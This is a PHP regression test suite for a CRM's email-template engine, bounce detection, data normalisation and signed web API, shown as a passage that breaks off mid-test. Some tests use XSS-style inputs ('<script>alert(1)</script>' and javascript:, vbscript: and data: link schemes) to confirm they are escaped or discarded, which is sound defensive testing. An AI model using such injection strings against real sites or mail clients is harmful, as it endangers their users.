<?php
declare(strict_types=1);

// ============================================================
//  Batería de tests de regresión — CRM INTELLIHELP
//
//  Corre SIN base de datos ni red: prueba la lógica pura, que es donde
//  aparecen los bugs que se repiten.
//
//  Uso local:     php test/run_tests.php
//  Contra el server: CRM_SRC=/ruta/al/crm/app php run_tests.php
//
//  Necesita mbstring y openssl. Lo de la API v1 que usa base (idempotencia,
//  duplicados, límites) corre contra una SQLite en memoria si está pdo_sqlite;
//  si no, ese bloque se saltea y lo avisa. En una máquina con PHP sin esas
//  extensiones cargadas:
//      php -d extension=mbstring -d extension=openssl -d extension=pdo_sqlite test/run_tests.php
//
//  REGLA DEL PROYECTO: cada defecto que aparece suma un caso acá, para que
//  no pueda volver.
// ============================================================

error_reporting(E_ALL);
ini_set('display_errors', '1');

if (!defined('BASE_PATH')) { define('BASE_PATH', '/crm'); }
if (!defined('APP'))       { define('APP', __DIR__); }

$_SERVER['HTTP_HOST']   = $_SERVER['HTTP_HOST'] ?? 'intellihelp.tech';
$_SERVER['SCRIPT_NAME'] = '/index.php';

$GLOBALS['CONFIG'] = [
    'app' => [
        'name'      => 'CRM Test',
        'canonical' => 'https://intellihelp.tech/crm',
        'timezone'  => 'America/Argentina/Buenos_Aires',
        'secret'    => 'test-secret',
    ],
    'db'     => ['name' => 'test', 'user' => 'test'],
    'google' => [
        'client_id'      => 'CID.apps.googleusercontent.com',
        'client_secret'  => 'SECRET',
        'allowed_domain' => 'intellihelp.tech',
    ],
];

date_default_timezone_set('America/Argentina/Buenos_Aires');

$SRC = getenv('CRM_SRC') ?: (__DIR__ . '/../app/web/app');
require $SRC . '/helpers.php';
require $SRC . '/crm.php';
require $SRC . '/registros.php';
require $SRC . '/actividad.php';
require $SRC . '/actividades.php';
require $SRC . '/envio.php';
require $SRC . '/bloques.php';
require $SRC . '/preajustes.php';
require $SRC . '/campanas.php';
require $SRC . '/imap.php';
require $SRC . '/google.php';
require $SRC . '/gcal.php';
require $SRC . '/agenda.php';
require $SRC . '/api.php';

// ---- Andamiaje mínimo ----
$T = 0; $F = 0; $fallos = [];

function ok(string $nombre, bool $cond): void {
    global $T, $F, $fallos;
    $T++;
    if ($cond) { echo "  [OK] $nombre\n"; }
    else { $F++; $fallos[] = $nombre; echo "  [XX] $nombre\n"; }
}
function eq(string $nombre, $got, $exp): void {
    ok($nombre . '  [esperado=' . var_export($exp, true) . ' obtenido=' . var_export($got, true) . ']', $got === $exp);
}
function feq(string $nombre, $got, $exp): void {
    ok($nombre . "  [esperado=$exp obtenido=$got]", abs(((float)$got) - ((float)$exp)) < 0.001);
}
function contiene(string $nombre, string $pajar, string $aguja): void {
    ok($nombre, str_contains($pajar, $aguja));
}
function no_contiene(string $nombre, string $pajar, string $aguja): void {
    ok($nombre, !str_contains($pajar, $aguja));
}

echo "== Normalización de provincias (datos reales del CSV de Zoho) ==\n";
eq('CABA',                        normalizar_provincia('CABA'), 'Ciudad de Buenos Aires');
eq('CIUDAD DE BUENOS AIRES',      normalizar_provincia('CIUDAD DE BUENOS AIRES'), 'Ciudad de Buenos Aires');
eq('Ciudad de Buenos Aires',      normalizar_provincia('Ciudad de Buenos Aires'), 'Ciudad de Buenos Aires');
eq('C.A.B.A.',                    normalizar_provincia('C.A.B.A.'), 'Ciudad de Buenos Aires');
eq('Federal District (Zoho)',     normalizar_provincia('Federal District'), 'Ciudad de Buenos Aires');
eq('BUENOS AIRES',                normalizar_provincia('BUENOS AIRES'), 'Buenos Aires');
eq('SANTA FE',                    normalizar_provincia('SANTA FE'), 'Santa Fe');
eq('CORDOBA sin tilde',           normalizar_provincia('CORDOBA'), 'Córdoba');
eq('ENTRE RIOS sin tilde',        normalizar_provincia('ENTRE RIOS'), 'Entre Ríos');
eq('TIERRA DEL FUEGO',            normalizar_provincia('TIERRA DEL FUEGO'), 'Tierra del Fuego');
eq('SANTIAGO DEL ESTERO',         normalizar_provincia('SANTIAGO DEL ESTERO'), 'Santiago del Estero');
eq('vacío -> null',               normalizar_provincia(''), null);
eq('desconocida se conserva',     normalizar_provincia('São Paulo'), 'São Paulo');

echo "== Normalización de países ==\n";
eq('ARGENTINA',                   normalizar_pais('ARGENTINA'), 'Argentina');
eq('Argentina',                   normalizar_pais('Argentina'), 'Argentina');
eq('Mexico -> México',            normalizar_pais('Mexico'), 'México');
eq('Brazil -> Brasil',            normalizar_pais('Brazil'), 'Brasil');
eq('URL en el campo país se descarta', normalizar_pais('http://www.pecanargentina.com/'), null);
eq('texto larguísimo se descarta', normalizar_pais('Team Leadership, Business Strategy, Negotiation and more'), null);

echo "== Limpieza de localidad (basura del CSV real) ==\n";
eq('localidad normal',            normalizar_localidad('9 DE JULIO'), '9 DE JULIO');
eq('aptitudes de LinkedIn se descartan',
   normalizar_localidad('Microsoft Word, Microsoft Excel, English, Estrategia empresarial, Contabilidad'), null);
eq('dirección completa se descarta',
   normalizar_localidad('Cerrito 1294, Piso 2. (C1010AAZ) Ciudad de Buenos Aires Argentina'), null);
eq('URL se descarta',             normalizar_localidad('https://carvajaltys.com.ar'), null);
eq('vacío -> null',               normalizar_localidad('   '), null);

echo "== CUIT (módulo 11) ==\n";
eq('válido 30-71420341-6',        validar_cuit('30714203416'), true);
eq('válido con guiones',          validar_cuit('30-71420341-6'), true);
eq('dígito verificador malo',     validar_cuit('30714203417'), false);
eq('10 dígitos',                  validar_cuit('3071420341'), false);
eq('normaliza',                   normalizar_cuit('30-71420341-6'), '30714203416');
eq('formatea',                    formatear_cuit('30714203416'), '30-71420341-6');

echo "== Formato de importes ==\n";
eq('ARS',                         money(1234.5), '$ 1.234,50');
eq('USD',                         money(1000, 'USD'), 'US$ 1.000,00');
eq('cero',                        money(0), '$ 0,00');

echo "== URLs (la dirección oficial es intellihelp.tech/crm) ==\n";
eq('url interna respeta BASE_PATH', url('contactos'), '/crm/contactos');
eq('url con barra inicial',       url('/contactos'), '/crm/contactos');
contiene('url_abs usa la canónica', url_abs('r/juan/demo'), 'https://intellihelp.tech/crm/r/juan/demo');
ok('redirect_uri de Google es HTTPS (evita redirect_uri_mismatch)',
   str_starts_with(google_redirect_uri(), 'https://'));
eq('redirect_uri exacto',         google_redirect_uri(), 'https://intellihelp.tech/crm/google-callback');

echo "== Paginación ==\n";
$p = paginar(0, 1, 25);
eq('sin registros hay 1 página',  $p['paginas'], 1);
$p = paginar(51, 3, 25);
eq('offset de la página 3',       $p['offset'], 50);
$p = paginar(51, 99, 25);
eq('página fuera de rango se acota', $p['page'], 3);

echo "== Plantillas de campaña ==\n";
$datos = ['nombre' => 'Juan', 'apellido' => 'Pérez', 'empresa' => 'ACME', 'email' => 'j@acme.com',
          'remitente' => 'Carlos', 'agenda' => 'https://x/agenda', 'baja' => 'https://x/baja'];
eq('reemplaza nombre',            render_plantilla('Hola {{nombre}},', $datos), 'Hola Juan,');
eq('reemplaza empresa',           render_plantilla('{{empresa}}', $datos), 'ACME');
eq('nombre vacío cae en «Hola»',  render_plantilla('{{nombre}}', ['nombre' => '']), 'Hola');
eq('nombre completo',             render_plantilla('{{nombre_completo}}', $datos), 'Juan Pérez');
contiene('deja el enlace de baja', render_plantilla('{{baja}}', $datos), 'https://x/baja');
eq('variable inexistente queda como está', render_plantilla('{{no_existe}}', $datos), '{{no_existe}}');

echo "== Detección de rebotes (lógica de Pulsemail) ==\n";
ok('mailer-daemon de Gmail',      es_rebote('mailer-daemon@googlemail.com', 'Delivery Status Notification'));
ok('postmaster de Exchange',      es_rebote('postmaster@empresa.com', 'Undeliverable'));
ok('MAILER-DAEMON en mayúsculas', es_rebote('MAILER-DAEMON@yahoo.com', 'failure notice'));
ok('mail-daemon con guion',       es_rebote('mail-daemon@dominio.com', 'x'));
ok('por asunto aunque el remitente no lo diga',
   es_rebote('noreply@server.com', 'Undelivered Mail Returned to Sender'));
ok('asunto en castellano',        es_rebote('info@server.com', 'Correo no entregado'));
ok('un cliente normal NO es rebote', !es_rebote('juan@acme.com', 'Re: propuesta comercial'));

echo "== Extracción del destinatario que rebotó ==\n";
$cuerpo = "Delivery incomplete\r\nFinal-Recipient: rfc822; juan@acme.com\r\nAction: failed\r\n";
eq('usa Final-Recipient',         extraer_destinatario_rebote($cuerpo)[0] ?? '', 'juan@acme.com');
$cuerpo2 = "No such user\r\nOriginal-Recipient: rfc822;MARIA@ACME.COM\r\n";
eq('normaliza a minúsculas',      extraer_destinatario_rebote($cuerpo2)[0] ?? '', 'maria@acme.com');
$cuerpo3 = 'El mensaje para pedro@acme.com no pudo entregarse.';
ok('fallback: busca cualquier dirección', in_array('pedro@acme.com', extraer_destinatario_rebote($cuerpo3), true));

echo "== Motor de bloques: el HTML tiene que sobrevivir en Outlook y en Gmail ==\n";
$pre  = plantillas_preajustes()['pulsemail'];
// El contexto de marca real siempre trae estos datos: el preajuste de
// Pulsemail toma de acá el número de WhatsApp del botón, así que sin ellos
// el verificador avisa —con razón— que ese botón no se va a dibujar.
$ctxE = ['empresa' => 'INTELLIHELP', 'empresa_web' => 'intellihelp.tech',
         'empresa_whatsapp' => '5491150274827', 'empresa_telefono' => '1177006868',
         'empresa_email' => 'info@intellihelp.tech', 'logo' => 'https://x/logo.png'];
$htmlP = bloques_render($pre['bloques'], $pre['ajustes'], $ctxE);
contiene('arma el documento completo',       $htmlP, '<!DOCTYPE html');
contiene('maqueta con tablas',               $htmlP, '<table role="presentation"');
contiene('ancho fijo de 600 px',             $htmlP, 'max-width:600px');
contiene('estilos en línea',                 $htmlP, 'style="');
contiene('respaldo VML para el botón de Outlook', $htmlP, 'v:roundrect');
contiene('media query para el celular',      $htmlP, '@media only screen and (max-width:620px)');
no_contiene('sin flexbox',                   $htmlP, 'display:flex');
no_contiene('sin grid',                      $htmlP, 'display:grid');
no_contiene('sin imágenes de fondo',         $htmlP, 'background-image');
no_contiene('sin JavaScript',                $htmlP, '<script');
no_contiene('sin formularios',               $htmlP, '<form');
ok('pesa bastante menos que el límite de Gmail', strlen($htmlP) < 102000,
   '(' . round(strlen($htmlP) / 1024, 1) . ' KB)');
// Hay una plantilla por cada servicio que ofrece la empresa, más tres formatos
// genéricos. Ninguna puede quedar a medias: una sin asunto o sin bloques se
// elige igual desde el desplegable y da un correo vacío.
$preajustes = plantillas_preajustes();
ok('los preajustes están completos',
   count($preajustes) >= 10
   && !array_filter($preajustes, fn($p) => empty($p['bloques']) || empty($p['asunto']) || empty($p['nombre'])),
   count($preajustes) . ' plantillas');

// Y las de servicio tienen que ser IGUALES entre sí: mismos colores y mismos
// bloques en el mismo orden. Es lo que hace que las campañas se reconozcan como
// de la misma empresa en vez de parecer ocho correos de ocho lugares distintos.
// Escritas a mano, una termina con el botón de otro color y de eso se entera el
// cliente antes que nosotros.
$servicios = ['pulsemail', 'soporte_empresas', 'seguridad', 'redes', 'ftth', 'iot', 'energia', 'soporte_hogar'];
$firma = null; $iguales = true;
foreach ($servicios as $k) {
    $p = $preajustes[$k] ?? null;
    if (!$p) { $iguales = false; break; }
    $a = $p['ajustes']; unset($a['preencabezado']);   // el pre-encabezado sí cambia
    $f = json_encode([$a, array_column($p['bloques'], 'tipo')]);
    if ($firma === null) { $firma = $f; } elseif ($f !== $firma) { $iguales = false; break; }
}
ok('todas las plantillas de servicio comparten colores y estructura', $iguales);
ok('y cada una dice de qué servicio habla',
   count(array_unique(array_map(fn($k) => $preajustes[$k]['nombre'] ?? '', $servicios))) === count($servicios));

echo "== Botón de WhatsApp (formato oficial) ==\n";
$wa = bloques_render([['tipo' => 'whatsapp', 'telefono' => '54 9 11 5027-4827',
                       'mensaje' => 'Hola, me interesa conocer más sobre sus soluciones.',
                       'texto' => 'Escribinos']], [], $ctxE);
contiene('usa api.whatsapp.com/send',  $wa, 'api.whatsapp.com/send/?phone=');
contiene('deja el número sin símbolos', $wa, 'phone=5491150274827');
contiene('codifica el mensaje',        $wa, 'text=Hola%2C+me+interesa');
contiene('lleva los parámetros oficiales', $wa, 'type=phone_number&amp;app_absent=0');
contiene('el texto del botón se respeta', $wa, 'Escribinos');
// Sin número el bloque no se dibuja (el documento sigue existiendo, vacío).
no_contiene('sin número no dibuja el botón',
            bloques_render([['tipo' => 'whatsapp']], [], []), 'whatsapp.com');
$waCtx = bloques_render([['tipo' => 'whatsapp']], [], ['empresa_whatsapp' => '5491150274827']);
contiene('si no le ponen número usa el de la empresa', $waCtx, 'phone=5491150274827');

echo "== Título sin nivel (correos de la agenda y de las alertas) ==\n";
$avisos = [];
set_error_handler(static function (int $n, string $m) use (&$avisos): bool { $avisos[] = $m; return true; });
$tit = bloques_render([['tipo' => 'titulo', 'texto' => 'Reunión confirmada']], [], []);
restore_error_handler();
eq('sin nivel no deja avisos de PHP', $avisos, []);
contiene('y sale con el tamaño del nivel 2', $tit, 'font-size:21px');

echo "== Botón de agenda ==\n";
$ag = bloques_render([['tipo' => 'agenda', 'texto' => 'Agendar reunión']], [], $ctxE);
contiene('deja la variable para resolver al enviar', $ag, '{{agenda}}');
contiene('respeta el texto del botón',               $ag, 'Agendar reunión');
contiene('se dibuja como botón, con respaldo Outlook', $ag, 'v:roundrect');

echo "== Escapado dentro del correo (no se puede inyectar HTML) ==\n";
$sucio = bloques_render([['tipo' => 'texto', 'texto' => '<script>alert(1)</script> & "comillas"']], [], $ctxE);
no_contiene('el HTML del usuario se escapa',  $sucio, '<script>alert');
contiene('queda como texto',                  $sucio, '&lt;script&gt;');
// Regresión: los esquemas peligrosos pasaban con un `https://` pegado
// adelante en vez de descartarse.
foreach (['javascript:alert(1)', 'JaVaScRiPt:alert(1)', "java\tscript:alert(1)",
          'data:text/html,<script>x</script>', 'vbscript:msgbox'] as $malo) {
    $url = bloques_render([['tipo' => 'boton', 'texto' => 'X', 'enlace' => $malo]], [], $ctxE);
    ok('descarta el enlace «' . recortar($malo, 22) . '»',
       !str_contains($url, 'href') || !preg_match('/javascript|vbscript|data:text/i', $url));
}
$buena = bloques_render([['tipo' => 'boton', 'texto' => 'X', 'enlace' => 'intellihelp.tech/agenda']], [], $ctxE);
contiene('completa el https:// en un enlace suelto', $buena, 'https://intellihelp.tech/agenda');
$varia = bloques_render([['tipo' => 'boton', 'texto' => 'X', 'enlace' => '{{agenda}}']], [], $ctxE);
contiene('deja pasar las variables de plantilla',    $varia, '{{agenda}}');

echo "== Versión en texto plano ==\n";
$txt = bloques_texto($pre['bloques'], $ctxE);
ok('genera texto plano',                      strlen($txt) > 100);
no_contiene('el texto plano no lleva etiquetas', $txt, '<');

echo "== Verificador de entregabilidad ==\n";
$okChk = bloques_verificar($pre['bloques'], 'Una propuesta para {{empresa}}', $htmlP, $txt, $ctxE);
ok('un correo sano no da errores',            count($okChk['errores']) === 0,
   '→ ' . json_encode(array_column($okChk['errores'], 0), JSON_UNESCAPED_UNICODE));
$malChk = bloques_verificar([], 'GRATIS OFERTA LIMITADA ACTÚA AHORA', '<html><script>x</script></html>', '');
ok('detecta el asunto en mayúsculas y las palabras riesgosas', count($malChk['errores']) >= 2);
$conJs = bloques_verificar([], 'Hola', '<html><script>x</script>{{baja}}</html>', 'hola');
ok('detecta JavaScript en el correo',
   (bool) array_filter($conJs['errores'], fn($x) => str_contains($x[0], 'JavaScript')));
$pesado = bloques_verificar([], 'Hola', str_repeat('<p>a</p>', 20000), 'hola');
ok('detecta que Gmail lo va a recortar',
   (bool) array_filter($pesado['errores'], fn($x) => str_contains($x[0], 'pesa')));
$sinTexto = bloques_verificar([], 'Hola', '<html><img src="a"><img src="b"><img src="c"></html>', 'hola');
ok('detecta demasiada imagen y poco texto',
   (bool) array_filter($sinTexto['errores'], fn($x) => str_contains($x[0], 'poco texto')));

echo "== Rebote definitivo vs. pasajero (decide si se archiva el contacto) ==\n";
// Definitivos: la casilla no existe o el dominio no existe. Archivan el contacto.
ok('DSN con estado 5.x.x',        es_rebote_duro("Action: failed\r\nStatus: 5.1.1\r\nDiagnostic-Code: smtp; 550"));
ok('«user unknown»',              es_rebote_duro('550 5.1.1 <x@y.com>: Recipient address rejected: User unknown'));
ok('«does not exist»',            es_rebote_duro('The email account that you tried to reach does not exist.'));
ok('dominio inexistente',         es_rebote_duro('Host or domain name not found. Name service error'));
ok('en castellano',               es_rebote_duro('La dirección no existe en este servidor'));
// Pasajeros: se arreglan solos. NO se archiva a nadie.
ok('buzón lleno NO es definitivo', !es_rebote_duro('552 5.2.2 Mailbox full / quota exceeded'));
ok('DSN con estado 4.x.x',        !es_rebote_duro("Action: delayed\r\nStatus: 4.4.1\r\nWill retry"));
ok('greylisting',                 !es_rebote_duro('451 4.7.1 Greylisted, try again later'));
ok('ante la duda, pasajero',      !es_rebote_duro('Algo raro pasó con este mensaje'));

echo "== Correos ==\n";
ok('válido',                      email_valido('juan.perez@acme.com.ar'));
ok('sin arroba no es válido',     !email_valido('juan.perez'));
eq('se normaliza',                normalizar_email('  Juan@ACME.com  '), 'juan@acme.com');

echo "== Slugs de la agenda pública ==\n";
eq('acentos y espacios',          slugificar('Reunión de presentación'), 'reunion-de-presentacion');
eq('30 min',                      slugificar('Demo 45 min'), 'demo-45-min');
eq('vacío tiene respaldo',        slugificar('   '), 'reunion');
eq('símbolos',                    slugificar('¡Café & Charla!'), 'cafe-charla');

echo "== Vencimiento de actividades ==\n";
[$txt, $cls] = actividad_vencimiento(['vence_el' => date('Y-m-d H:i:s', strtotime('-2 days')),
                                      'inicia_el' => null, 'completada_en' => null]);
eq('vencida se marca en rojo',    $cls, 'badge-rej');
[$txt, $cls] = actividad_vencimiento(['vence_el' => date('Y-m-d H:i:s', strtotime('+2 days')),
                                      'inicia_el' => null, 'completada_en' => null]);
eq('futura es informativa',       $cls, 'badge-info');
[$txt, $cls] = actividad_vencimiento(['vence_el' => date('Y-m-d 23:00:00'),
                                      'inicia_el' => null, 'completada_en' => null]);
eq('la de hoy se destaca',        $cls, 'badge-pend');
[$txt, $cls] = actividad_vencimiento(['vence_el' => date('Y-m-d H:i:s', strtotime('-2 days')),
                                      'inicia_el' => null, 'completada_en' => date('Y-m-d H:i:s')]);
eq('completada aunque venciera',  $cls, 'badge-ok');

echo "== Escapado y formato ==\n";
eq('escapa HTML',                 e('<script>'), '&lt;script&gt;');
eq('escapa comillas',             e('a"b'), 'a&quot;b');
eq('recorta con puntos',          recortar('abcdefghij', 5), 'abcd…');
eq('no recorta si entra',         recortar('abc', 5), 'abc');
eq('iniciales de dos palabras',   iniciales('Juan Pérez'), 'JP');
eq('iniciales de una',            iniciales('Cargill'), 'C');
eq('iniciales de vacío',          iniciales(''), '?');
eq('fecha corta',                 fecha_corta('2026-07-30'), '30/07/2026');
eq('fecha vacía',                 fecha_corta(null), '—');
contiene('fecha larga en castellano', fecha_larga('2026-07-30'), 'de julio de 2026');

echo "== Badges ==\n";
contiene('envío enviado',         badge_envio('enviado'), 'badge-ok');
contiene('envío rebotado',        badge_envio('rebotado'), 'badge-rej');
contiene('campaña enviando',      badge_campana('enviando'), 'badge-ok');
no_contiene('nunca un badge pelado', badge_envio('pendiente'), 'class="badge "');

echo "== Filtros del CRON (regresión: columnas ambiguas) ==\n";
// El listado del CRON hace JOIN con `usuarios`, que también tiene
// `creado_en`: sin calificar las columnas, MySQL rechazaba la consulta por
// ambigüedad y la pantalla no abría.
[$where, $params] = actividad_where(['canal' => 'app', 'q' => 'hola', 'desde' => '2026-01-01']);
contiene('la fecha va calificada',   $where, 'a.creado_en');
contiene('el canal va calificado',   $where, 'a.canal');
contiene('la búsqueda va calificada', $where, 'a.actor LIKE');
ok('ninguna columna queda sin alias',
   !preg_match('/(?<![a-z.])(creado_en|canal|tipo|actor|accion|detalle|ip)\s*(>=|<=|=|LIKE)/', $where));
// canal + desde + los cuatro LIKE de la búsqueda
eq('los parámetros acompañan al WHERE', count($params), 6);

echo "== Cifrado de los tokens de Google ==\n";
$claro = 'refresh-token-de-prueba-1234';
$cifr  = cifrar($claro);
ok('el cifrado no deja el texto en claro', !str_contains($cifr, $claro));
eq('descifra correctamente',      descifrar($cifr), $claro);
eq('blob corrupto no revienta',   descifrar('no-es-base64-valido'), '');

echo "== Direcciones dentro de un párrafo del correo ==\n";
// Una dirección escrita en un párrafo salía como texto pelado: el destinatario
// la veía y no podía tocarla. Pasaba con el enlace para cancelar una reunión.
$p = bloques_render([['tipo' => 'texto', 'texto' => 'Cancelá acá: https://intellihelp.tech/r/x?t=abc y listo.']]);
ok('una dirección se vuelve enlace', str_contains($p, '<a href="https://intellihelp.tech/r/x?t=abc"'));
$p2 = bloques_render([['tipo' => 'texto', 'texto' => 'Entrá a https://intellihelp.tech.']]);
ok('el punto final no queda dentro del enlace', str_contains($p2, 'href="https://intellihelp.tech"'));
// El texto lo escribe una persona: nunca puede meter HTML en el correo.
$p3 = bloques_render([['tipo' => 'texto', 'texto' => '<script>alert(1)</script> y https://ok.com']]);
ok('el texto de quien escribe no puede inyectar HTML', !str_contains($p3, '<script>'));
ok('y la dirección sigue funcionando', str_contains($p3, 'href="https://ok.com"'));

echo "== Teléfonos ==
";
// `type="tel"` NO valida nada: es sólo una pista para que el celular abra el
// teclado numérico. Con ese atributo puesto se podían escribir letras igual y
// quedaban guardadas como número de contacto. La garantía es esta función.
ok('acepta un número suelto',         telefono_valido('1156660181'));
ok('acepta el formato internacional', telefono_valido('+54 9 11 5027-4827'));
ok('acepta paréntesis y guiones',     telefono_valido('(011) 4567-8900'));
ok('rechaza letras',                  !telefono_valido('asdasd'));
ok('rechaza números con letras',      !telefono_valido('11abc4567'));
ok('rechaza algo demasiado corto',    !telefono_valido('123'));
ok('rechaza una etiqueta HTML',       !telefono_valido('<script>x</script>'));
ok('el campo vacío es válido (es opcional)', telefono_valido(''));
eq('lo que no es teléfono no se guarda a medias', normalizar_telefono('asdasd'), null);
eq('lo válido se guarda tal cual',    normalizar_telefono('+54 9 11 5027-4827'), '+54 9 11 5027-4827');

echo "== Cómo se muestra un teléfono ==
";
eq('móvil argentino',  telefono_formato('5491150274827'), '+54 9 11 5027-4827');
eq('vacío',            telefono_formato(''), '');
eq('lo que no se reconoce se muestra tal cual', telefono_formato('+1 555 0100'), '+1 555 0100');

echo "== Invitación de calendario (el botón de aceptar del correo) ==\n";
// El archivo de calendario es lo que hace que Gmail muestre «Sí / No / Quizás».
// Si se pasa del ancho o corta un acento al medio, el cliente lo descarta y el
// correo vuelve a quedar sin forma de aceptar la reunión.
$corta = ics_plegar(['SUMMARY:Reunión corta']);
eq('una línea corta no se toca', $corta, "SUMMARY:Reunión corta\r\n");

$largo  = 'DESCRIPTION:' . str_repeat('Coordinación de la reunión con INTELLIHELP. ', 6);
$plegado = ics_plegar([$largo]);
$fisicas = explode("\r\n", rtrim($plegado, "\r\n"));
ok('una línea larga se corta en varias', count($fisicas) > 1, '→ ' . count($fisicas));
$anchas = array_filter($fisicas, fn($l) => strlen($l) > 75);
eq('ninguna línea pasa los 75 octetos', count($anchas), 0);
ok('las continuaciones arrancan con un espacio',
   count(array_filter(array_slice($fisicas, 1), fn($l) => $l[0] === ' ')) === count($fisicas) - 1);
// El corte se cuenta en octetos, así que puede caer justo en el medio de un
// carácter de dos bytes. Al volver a unir, el texto tiene que quedar igual.
$unido = str_replace("\r\n ", '', $plegado);
eq('al desplegarla vuelve a ser la misma', rtrim($unido, "\r\n"), $largo);
ok('los acentos quedan intactos', preg_match('//u', $plegado) === 1);

// Peor caso: un acento justo en el límite del corte.
$borde = 'X:' . str_repeat('a', 72) . 'ñññññ';
$pl    = ics_plegar([$borde]);
ok('un acento sobre el corte no se parte', preg_match('//u', $pl) === 1);
eq('y el texto se recupera entero', rtrim(str_replace("\r\n ", '', $pl), "\r\n"), $borde);

// ============================================================
//  Entradas desde la web (md/INTEGRACION-WEB.md)
// ============================================================

echo "== API v1: firma de los pedidos ==\n";
// Vectores fijos: la web (public/api/_crm.php) tiene que llegar a los mismos
// valores. Si alguno de los dos lados cambia el texto que se firma, falla acá
// antes que en producción con un 401 que nadie entiende.
$sec  = 'secreto-de-prueba-0123456789abcdef';
$ts   = '1793709000';
$ruta = '/crm-pruebas/api/v1/reserva';
$body = '{"tipo":"diagnostico"}';
$idem = 'web-0123456789abcdef0123456789abcdef01234567';
$iph  = str_repeat('ab', 32);
eq('texto canónico: hora, método, ruta, idempotencia, hash de IP y cuerpo separados por saltos',
   api_firma_canonica($ts, 'post', $ruta, $idem, $iph, $body),
   "1793709000\nPOST\n/crm-pruebas/api/v1/reserva\n$idem\n$iph\n{\"tipo\":\"diagnostico\"}");
eq('vector fijo POST', api_firma($sec, $ts, 'POST', $ruta, $idem, $iph, $body),
   '47924e27c99926de0277e17806be3d16f4e83f5241b26535469e4c4d829e511c');
eq('vector fijo GET (con la consulta, sin cabeceras de escritura y sin cuerpo)',
   api_firma($sec, $ts, 'GET', '/crm/api/v1/disponibilidad?tipo=diagnostico&vendedor=bsierra&desde=2026-11-02&hasta=2026-11-15', '', '', ''),
   'fce30eb9840e1593f0efd48f878fdc96487f69b7ffe28928eae4808226562b8a');
$firmaOk = api_firma($sec, $ts, 'POST', $ruta, $idem, $iph, $body);
$coincide = static fn(string $s, string $t, string $m, string $r, string $i, string $h, string $b, string $f): bool
    => api_firma_coincide($s, $t, $m, $r, $i, $h, $b, $f);
ok('firma válida: se acepta', $coincide($sec, $ts, 'POST', $ruta, $idem, $iph, $body, $firmaOk));
ok('firma en mayúsculas: también (es hexadecimal)', $coincide($sec, $ts, 'POST', $ruta, $idem, $iph, $body, strtoupper($firmaOk)));
ok('cuerpo alterado en un byte: se rechaza', !$coincide($sec, $ts, 'POST', $ruta, $idem, $iph, '{"tipo":"diagnostic0"}', $firmaOk));
ok('otra clave de idempotencia: se rechaza (no se puede reenviar como pedido nuevo)',
   !$coincide($sec, $ts, 'POST', $ruta, $idem . 'x', $iph, $body, $firmaOk));
ok('otro hash de IP: se rechaza (no se puede esquivar el límite por visitante)',
   !$coincide($sec, $ts, 'POST', $ruta, $idem, str_repeat('cd', 32), $body, $firmaOk));
ok('la firma de pruebas no sirve en producción', !$coincide($sec, $ts, 'POST', '/crm/api/v1/reserva', $idem, $iph, $body, $firmaOk));
ok('ni para otro recurso', !$coincide($sec, $ts, 'POST', '/crm-pruebas/api/v1/entrada', $idem, $iph, $body, $firmaOk));
ok('ni con otro método', !$coincide($sec, $ts, 'GET', $ruta, $idem, $iph, $body, $firmaOk));
ok('ni con otra hora', !$coincide($sec, '1793709001', 'POST', $ruta, $idem, $iph, $body, $firmaOk));
ok('ni con otro secreto', !$coincide($sec . 'x', $ts, 'POST', $ruta, $idem, $iph, $body, $firmaOk));
ok('sin secreto no hay firma que valga',
   !$coincide('', $ts, 'POST', $ruta, $idem, $iph, $body, api_firma('', $ts, 'POST', $ruta, $idem, $iph, $body)));
ok('una firma que no es hexadecimal se rechaza', !$coincide($sec, $ts, 'POST', $ruta, $idem, $iph, $body, str_repeat('z', 64)));
ok('una firma recortada se rechaza', !$coincide($sec, $ts, 'POST', $ruta, $idem, $iph, $body, substr($firmaOk, 0, 63)));

$ahora = 1793709000;
ok('hora actual: válida',             api_hora_valida((string)$ahora, $ahora));
ok('hace 300 s: todavía válida',      api_hora_valida((string)($ahora - 300), $ahora));
ok('hace 301 s: vencida',             !api_hora_valida((string)($ahora - 301), $ahora));
ok('301 s en el futuro: rechazada',   !api_hora_valida((string)($ahora + 301), $ahora));
ok('sin hora: rechazada',             !api_hora_valida('', $ahora));
ok('con decimales: rechazada',        !api_hora_valida($ahora . '.5', $ahora));
ok('en milisegundos: rechazada',      !api_hora_valida($ahora . '000', $ahora));

echo "== API v1: validación de lo que manda la web ==\n";
$cuerpo = static function (array $cambios = [], array $sacar = []): array {
    $j = array_replace_recursive([
        'tipo'     => 'diagnostico',
        'vendedor' => 'bsierra',
        'inicio'   => '2026-11-03T09:30:00-03:00',
        'persona'  => [
            'nombre'   => 'Juana Prueba',
            'empresa'  => 'Empresa de Prueba SRL',
            'email'    => '  BSierra@Intellihelp.tech ',
            'telefono' => '+54 11 5555-0000',
            'servicio' => 'Soporte IT, mesa de ayuda u outsourcing IT',
            'mensaje'  => "Hola\r\nnecesitamos ayuda\x07",
        ],
        'consentimiento' => [
            'aceptado' => true,
            'fecha'    => date('c'),
            'version'  => 'web-2026-11',
            'texto'    => 'Acepto que Intellihelp use estos datos para responder mi consulta y coordinar la reunión, según el aviso de privacidad.',
        ],
        'novedades' => false,
        'origen'    => [
            'pagina' => '/diagnostico/', 'canal' => 'Google Ads',
            'utm_source' => 'google', 'utm_medium' => 'cpc', 'utm_campaign' => 'diagnostico-it',
            'utm_term' => '', 'utm_content' => '', 'gclid' => 'Cj0KCQ_prueba-1', 'li_fat_id' => '',
            'referrer' => 'https://www.google.com/', 'landing' => '/servicios/soporte-it/', 'visitas_landing' => 2,
        ],
    ], $cambios);
    foreach ($sacar as $ruta) {
        $partes = explode('.', $ruta);
        if (count($partes) === 1) { unset($j[$partes[0]]); } else { unset($j[$partes[0]][$partes[1]]); }
    }
    return $j;
};
$errores = static fn(array $j, bool $reserva = true): array => api_validar_entrada($j, $reserva)[1];

[$limpio, $err] = api_validar_entrada($cuerpo(), true);
eq('un pedido correcto no tiene errores', $err, []);
eq('el correo se normaliza a minúsculas y sin espacios', $limpio['email'], 'bsierra@intellihelp.tech');
eq('el mensaje pierde los caracteres de control y unifica los saltos', $limpio['mensaje'], "Hola\nnecesitamos ayuda");
eq('el inicio ISO se lee en segundos', $limpio['inicio'], (new DateTimeImmutable('2026-11-03T09:30:00-03:00'))->getTimestamp());
eq('el inicio también puede venir en segundos', api_validar_entrada($cuerpo(['inicio' => 1793709000]), true)[0]['inicio'], 1793709000);
eq('del consentimiento se guarda la huella del texto, no el texto',
